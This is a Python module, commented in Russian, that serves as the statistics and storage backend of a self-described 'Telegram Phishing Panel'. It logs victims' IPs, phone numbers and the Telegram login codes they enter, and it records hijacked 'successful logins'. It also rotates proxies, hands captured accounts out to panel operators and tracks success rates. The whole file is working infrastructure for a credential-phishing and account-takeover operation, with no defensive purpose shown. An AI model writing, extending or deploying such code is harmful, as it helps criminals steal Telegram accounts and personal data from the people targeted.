#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
stats_db.py - Расширенная JSON-база данных для Telegram Phishing Panel
Версия: 3.2 - Добавлены все методы для прокси
"""

import json
import os
import time
import re
from datetime import datetime
from config import Config

class StatsDB:
    """JSON-based database with extended functionality."""
    
    def __init__(self, db_file):
        self.db_file = db_file
        self.data = self._load()
    
    def _load(self):
        """Load data from JSON file."""
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except json.JSONDecodeError:
                if os.path.getsize(self.db_file) > 0:
                    backup_file = self.db_file + '.backup_' + datetime.now().strftime('%Y%m%d_%H%M%S')
                    try:
                        os.rename(self.db_file, backup_file)
                        print(f"⚠️ Поврежденный файл БД переименован в {backup_file}")
                    except:
                        pass
                return self._get_empty_data()
            except Exception as e:
                print(f"⚠️ Ошибка загрузки БД: {e}")
                return self._get_empty_data()
        return self._get_empty_data()
    
    def _get_empty_data(self):
        """Return empty data structure."""
        return {
            'visits': [],
            'phone_entries': [],
            'code_entries': [],
            'successful_logins': [],
            'failed_attempts': [],
            'proxies': [],
            'blacklist': [],
            'users': [],
            'account_info': {},
            'proxy_stats': {},
            'system_logs': [],
            'settings': {
                'max_sessions': 1000,
                'rate_limit': 100,
                'notifications_enabled': True,
                'version': '3.2'
            }
        }
    
    def save(self):
        """Save data to JSON file with error handling."""
        try:
            if os.path.exists(self.db_file):
                try:
                    with open(self.db_file, 'r', encoding='utf-8') as f:
                        old_data = json.load(f)
                    if old_data != self.data:
                        backup_file = self.db_file + '.backup'
                        with open(backup_file, 'w', encoding='utf-8') as f:
                            json.dump(old_data, f, indent=2, ensure_ascii=False)
                except:
                    pass
            
            with open(self.db_file, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, indent=2, ensure_ascii=False, default=str)
            return True
        except Exception as e:
            print(f"❌ Ошибка сохранения БД: {e}")
            return False
    
    # ============================================
    # ОСНОВНЫЕ МЕТОДЫ
    # ============================================
    
    def add_visit(self, ip, user_agent):
        """Track page visits."""
        if 'visits' not in self.data:
            self.data['visits'] = []
        
        visit = {
            'ip': ip,
            'user_agent': user_agent[:200] if user_agent else 'Unknown',
            'time': time.time(),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        self.data['visits'].append(visit)
        
        if len(self.data['visits']) > 10000:
            self.data['visits'] = self.data['visits'][-10000:]
        
        self.save()
        return visit
    
    def add_phone(self, phone, ip):
        """Track phone number submission."""
        if 'phone_entries' not in self.data:
            self.data['phone_entries'] = []
        
        entry = {
            'phone': phone,
            'ip': ip,
            'time': time.time(),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        self.data['phone_entries'].append(entry)
        
        if len(self.data['phone_entries']) > 10000:
            self.data['phone_entries'] = self.data['phone_entries'][-10000:]
        
        self.save()
        return entry
    
    def add_code_attempt(self, phone, code, ip, success=False):
        """Track code entry attempt."""
        entry = {
            'phone': phone,
            'code': code,
            'ip': ip,
            'time': time.time(),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        if success:
            if 'successful_logins' not in self.data:
                self.data['successful_logins'] = []
            self.data['successful_logins'].append(entry)
            if len(self.data['successful_logins']) > 10000:
                self.data['successful_logins'] = self.data['successful_logins'][-10000:]
        else:
            if 'code_entries' not in self.data:
                self.data['code_entries'] = []
            self.data['code_entries'].append(entry)
            if len(self.data['code_entries']) > 10000:
                self.data['code_entries'] = self.data['code_entries'][-10000:]
        
        self.save()
        return entry
    
    def add_failed_attempt(self, phone, reason, ip):
        """Track failed login attempts."""
        if 'failed_attempts' not in self.data:
            self.data['failed_attempts'] = []
        
        entry = {
            'phone': phone,
            'reason': reason,
            'ip': ip,
            'time': time.time(),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        self.data['failed_attempts'].append(entry)
        
        if len(self.data['failed_attempts']) > 5000:
            self.data['failed_attempts'] = self.data['failed_attempts'][-5000:]
        
        self.save()
        return entry
    
    # ============================================
    # СТАТИСТИКА
    # ============================================
    
    def get_stats(self):
        """Get aggregated statistics."""
        total = {
            'visits': len(self.data.get('visits', [])),
            'phones': len(self.data.get('phone_entries', [])),
            'codes': len(self.data.get('code_entries', [])),
            'success': len(self.data.get('successful_logins', [])),
            'failed': len(self.data.get('failed_attempts', []))
        }
        
        daily = {}
        now = time.time()
        
        for i in range(7):
            day_start = now - (i * 86400)
            day_end = day_start + 86400
            day_str = datetime.fromtimestamp(day_start).strftime('%Y-%m-%d')
            
            daily[day_str] = {'visits': 0, 'phones': 0, 'codes': 0, 'success': 0, 'failed': 0}
            
            for entry_type, key in [
                ('visits', 'visits'), ('phone_entries', 'phones'),
                ('code_entries', 'codes'), ('successful_logins', 'success'),
                ('failed_attempts', 'failed')
            ]:
                for entry in self.data.get(entry_type, []):
                    if day_start <= entry.get('time', 0) <= day_end:
                        daily[day_str][key] += 1
        
        daily_list = [{'date': date, **stats} for date, stats in sorted(daily.items(), reverse=True)]
        
        result = {**total, 'daily': daily_list}
        for i, day_data in enumerate(daily_list[:7]):
            result[f'visits_day_{i}'] = day_data['visits']
            result[f'phones_day_{i}'] = day_data['phones']
            result[f'success_day_{i}'] = day_data['success']
        
        return result
    
    def get_current_rps(self):
        """Get current requests per second."""
        minute_ago = time.time() - 60
        count = 0
        
        for entry_type in ['visits', 'phone_entries', 'code_entries']:
            for entry in self.data.get(entry_type, []):
                if entry.get('time', 0) > minute_ago:
                    count += 1
        
        return count // 60 if count > 0 else 0
    
    def get_success_rate(self):
        """Get success rate percentage."""
        phones = len(self.data.get('phone_entries', []))
        success = len(self.data.get('successful_logins', []))
        if phones == 0:
            return 0
        return round((success / phones) * 100, 2)
    
    def get_daily_requests(self):
        """Get number of requests today."""
        today_start = datetime.now().replace(hour=0, minute=0, second=0).timestamp()
        count = 0
        
        for entry_type in ['visits', 'phone_entries', 'code_entries']:
            for entry in self.data.get(entry_type, []):
                if entry.get('time', 0) > today_start:
                    count += 1
        
        return count
    
    def get_active_sessions(self):
        """Get number of active sessions in last 5 minutes."""
        five_min_ago = time.time() - 300
        count = 0
        
        for entry in self.data.get('successful_logins', []):
            if entry.get('time', 0) > five_min_ago:
                count += 1
        
        return count
    
    def get_history(self, period, limit):
        """Get historical data for charts."""
        if period == 'day':
            labels = []
            visits = []
            success = []
            
            for i in range(23, -1, -1):
                hour_start = time.time() - (i * 3600)
                labels.append(datetime.fromtimestamp(hour_start).strftime('%H:00'))
                
                v_count = 0
                s_count = 0
                
                for entry in self.data.get('visits', []):
                    if hour_start <= entry.get('time', 0) <= hour_start + 3600:
                        v_count += 1
                
                for entry in self.data.get('successful_logins', []):
                    if hour_start <= entry.get('time', 0) <= hour_start + 3600:
                        s_count += 1
                
                visits.append(v_count)
                success.append(s_count)
            
            return {'labels': labels, 'visits': visits, 'success': success}
        
        else:
            days = min(limit, 30)
            labels = []
            visits = []
            success = []
            
            for i in range(days - 1, -1, -1):
                day_start = time.time() - (i * 86400)
                labels.append(datetime.fromtimestamp(day_start).strftime('%d.%m'))
                
                v_count = 0
                s_count = 0
                
                for entry in self.data.get('visits', []):
                    if day_start <= entry.get('time', 0) <= day_start + 86400:
                        v_count += 1
                
                for entry in self.data.get('successful_logins', []):
                    if day_start <= entry.get('time', 0) <= day_start + 86400:
                        s_count += 1
                
                visits.append(v_count)
                success.append(s_count)
            
            return {'labels': labels, 'visits': visits, 'success': success}
    
    # ============================================
    # УПРАВЛЕНИЕ ПРОКСИ
    # ============================================
    
    def get_proxies(self):
        """Get all proxies."""
        return self.data.get('proxies', [])
    
    def add_proxy(self, proxy_data):
        """Add a single proxy."""
        proxies = self.get_proxies()
        new_id = max([p.get('id', 0) for p in proxies] + [0]) + 1
        
        proxy_entry = {
            'id': new_id,
            'type': proxy_data.get('type', 'socks5'),
            'host': proxy_data.get('host'),
            'port': proxy_data.get('port'),
            'username': proxy_data.get('username'),
            'password': proxy_data.get('password'),
            'name': proxy_data.get('name', f"{proxy_data.get('host')}:{proxy_data.get('port')}"),
            'country': proxy_data.get('country', ''),
            'description': proxy_data.get('description', ''),
            'last_check': None,
            'status': 'unknown',
            'enabled': True,
            'created': time.time(),
            'requests_count': 0,
            'success_count': 0,
            'fail_count': 0,
            'avg_speed': None,
            'last_error': None
        }
        
        proxies.append(proxy_entry)
        self.data['proxies'] = proxies
        self.save()
        return new_id
    
    def add_proxies_bulk(self, proxies_text):
        """Add multiple proxies from text."""
        lines = proxies_text.strip().split('\n')
        added = 0
        errors = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            proxy_data = self._parse_proxy_string(line)
            if proxy_data:
                self.add_proxy(proxy_data)
                added += 1
            else:
                errors.append(line)
        
        return {'added': added, 'errors': errors}
    
    def _parse_proxy_string(self, proxy_str):
        """Parse proxy string format: [type://][user:pass@]host:port"""
        pattern = r'(?:(socks5|socks4|http|https)://)?(?:([^:@]+):([^:@]+)@)?([^:@]+):(\d+)'
        match = re.match(pattern, proxy_str)
        
        if not match:
            return None
        
        p_type, p_user, p_pass, p_host, p_port = match.groups()
        return {
            'type': p_type or 'socks5',
            'username': p_user,
            'password': p_pass,
            'host': p_host,
            'port': int(p_port)
        }
    
    def update_proxy_status(self, proxy_id, status, speed=None, error=None):
        """
        Update proxy status with error message.
        
        Args:
            proxy_id: ID прокси
            status: 'working', 'dead', 'checking', 'unknown'
            speed: строка со скоростью (например, '150ms')
            error: сообщение об ошибке
        """
        proxies = self.get_proxies()
        for p in proxies:
            if p.get('id') == proxy_id:
                p['status'] = status
                p['last_check'] = time.time()
                
                if speed:
                    p['speed'] = speed
                    try:
                        speed_val = float(speed.replace('ms', ''))
                        current_avg = p.get('avg_speed')
                        if current_avg:
                            p['avg_speed'] = round((current_avg * 0.7 + speed_val * 0.3), 2)
                        else:
                            p['avg_speed'] = speed_val
                    except:
                        pass
                
                if error:
                    p['last_error'] = error[:200] if error else None
                elif status == 'working':
                    p['last_error'] = None
                
                self.data['proxies'] = proxies
                self.save()
                return True
        return False
    
    def delete_proxy(self, proxy_id):
        """Delete a proxy."""
        self.data['proxies'] = [p for p in self.get_proxies() if p.get('id') != proxy_id]
        self.save()
    
    def toggle_proxy(self, proxy_id):
        """Enable/disable proxy."""
        for p in self.get_proxies():
            if p.get('id') == proxy_id:
                p['enabled'] = not p.get('enabled', True)
                self.save()
                return p['enabled']
        return None
    
    def record_proxy_usage(self, proxy_id, success, response_time):
        """Record proxy usage statistics."""
        for p in self.get_proxies():
            if p.get('id') == proxy_id:
                p['requests_count'] = p.get('requests_count', 0) + 1
                if success:
                    p['success_count'] = p.get('success_count', 0) + 1
                else:
                    p['fail_count'] = p.get('fail_count', 0) + 1
                
                current_avg = p.get('avg_speed')
                if current_avg:
                    p['avg_speed'] = round((current_avg * 0.9 + response_time * 0.1), 2)
                else:
                    p['avg_speed'] = response_time
                
                self.save()
                return True
        return False
    
    # ============================================
    # УПРАВЛЕНИЕ АККАУНТАМИ
    # ============================================
    
    def get_account_info(self, account_id):
        """Get additional info for an account."""
        return self.data.get('account_info', {}).get(account_id, {})
    
    def update_account_info(self, account_id, info):
        """Update account information."""
        if 'account_info' not in self.data:
            self.data['account_info'] = {}
        
        clean_info = {}
        for key, value in info.items():
            if isinstance(value, (str, int, float, bool, type(None))):
                clean_info[key] = value
            else:
                clean_info[key] = str(value)
        
        self.data['account_info'][account_id] = clean_info
        self.save()
    
    def get_account_history(self, account_id):
        """Get usage history for an account."""
        history = []
        
        for entry in self.data.get('successful_logins', []):
            phone = entry.get('phone', '').replace('+', '')
            if phone == account_id or phone.endswith(account_id):
                history.append({
                    'type': 'login',
                    'time': entry.get('time'),
                    'date': entry.get('date'),
                    'ip': entry.get('ip'),
                    'method': entry.get('method', 'code')
                })
        
        history.sort(key=lambda x: x.get('time', 0), reverse=True)
        return history[:50]
    
    # ============================================
    # УПРАВЛЕНИЕ ПОЛЬЗОВАТЕЛЯМИ
    # ============================================
    
    def get_users(self):
        """Get all users."""
        return self.data.get('users', [])
    
    def add_user(self, user_data):
        """Add a new user."""
        users = self.get_users()
        
        for user in users:
            if user.get('username') == user_data.get('username'):
                return False
        
        users.append(user_data)
        self.data['users'] = users
        self.save()
        return True
    
    def update_user(self, user_id, updates):
        """Update user information."""
        users = self.get_users()
        for user in users:
            if user.get('id') == user_id:
                user.update(updates)
                self.data['users'] = users
                self.save()
                return True
        return False
    
    def delete_user(self, user_id):
        """Delete a user."""
        users = [u for u in self.get_users() if u.get('id') != user_id]
        self.data['users'] = users
        self.save()
        return True
    
    def toggle_user(self, user_id):
        """Toggle user active status."""
        users = self.get_users()
        for user in users:
            if user.get('id') == user_id:
                user['active'] = not user.get('active', True)
                self.data['users'] = users
                self.save()
                return user['active']
        return None
    
    def assign_accounts_to_user(self, user_id, account_ids):
        """Assign accounts to a user."""
        users = self.get_users()
        for user in users:
            if user.get('id') == user_id:
                user['assigned_accounts'] = account_ids
                self.data['users'] = users
                self.save()
                
                for acc_id in account_ids:
                    info = self.get_account_info(acc_id)
                    info['owner'] = user.get('username')
                    info['assigned_at'] = time.time()
                    self.update_account_info(acc_id, info)
                
                return {'assigned': len(account_ids), 'failed': 0}
        return {'assigned': 0, 'failed': len(account_ids)}
    
    def get_user_activity(self):
        """Get user activity statistics."""
        activity = {}
        log_file = os.path.join(os.path.dirname(self.db_file), 'logs', 'admin_actions.json')
        
        if os.path.exists(log_file):
            try:
                with open(log_file, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                
                for log in logs[-1000:]:
                    username = log.get('username')
                    if username:
                        if username not in activity:
                            activity[username] = {
                                'total_actions': 0,
                                'last_action': None,
                                'actions_by_type': {}
                            }
                        
                        activity[username]['total_actions'] += 1
                        activity[username]['last_action'] = log.get('date')
                        
                        action_type = log.get('action')
                        if action_type:
                            activity[username]['actions_by_type'][action_type] = \
                                activity[username]['actions_by_type'].get(action_type, 0) + 1
            except:
                pass
        
        return activity
    
    # ============================================
    # НАСТРОЙКИ
    # ============================================
    
    def get_settings(self):
        """Get system settings."""
        return self.data.get('settings', {})
    
    def update_settings(self, settings):
        """Update system settings."""
        self.data['settings'].update(settings)
        self.save()
    
    def get_max_sessions(self):
        """Get maximum number of sessions allowed."""
        return self.data.get('settings', {}).get('max_sessions', 1000)
    
    def get_rate_limit(self):
        """Get rate limit per minute."""
        return self.data.get('settings', {}).get('rate_limit', 100)
    
    # ============================================
    # БЛЭКЛИСТ
    # ============================================
    
    def is_blacklisted(self, ip):
        """Check if IP is blacklisted."""
        return any(b['ip'] == ip for b in self.data.get('blacklist', []))
    
    def add_to_blacklist(self, ip, reason):
        """Add IP to blacklist."""
        blacklist = self.data.get('blacklist', [])
        
        if any(b['ip'] == ip for b in blacklist):
            return False
        
        blacklist.append({
            'ip': ip,
            'reason': reason[:200] if reason else 'Unknown',
            'added': time.time(),
            'date': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
        self.data['blacklist'] = blacklist
        self.save()
        return True
    
    def remove_from_blacklist(self, ip):
        """Remove IP from blacklist."""
        blacklist = [b for b in self.data.get('blacklist', []) if b['ip'] != ip]
        self.data['blacklist'] = blacklist
        self.save()
        return True

# Global instance
try:
    stats_db = StatsDB(Config.STATS_DB_PATH)
    print(f"✅ StatsDB инициализирована: {Config.STATS_DB_PATH}")
    
    if hasattr(stats_db, 'update_proxy_status'):
        print("✅ Метод update_proxy_status доступен")
    else:
        print("❌ Метод update_proxy_status НЕ найден!")
        
except Exception as e:
    print(f"❌ Ошибка инициализации StatsDB: {e}")
    stats_db = None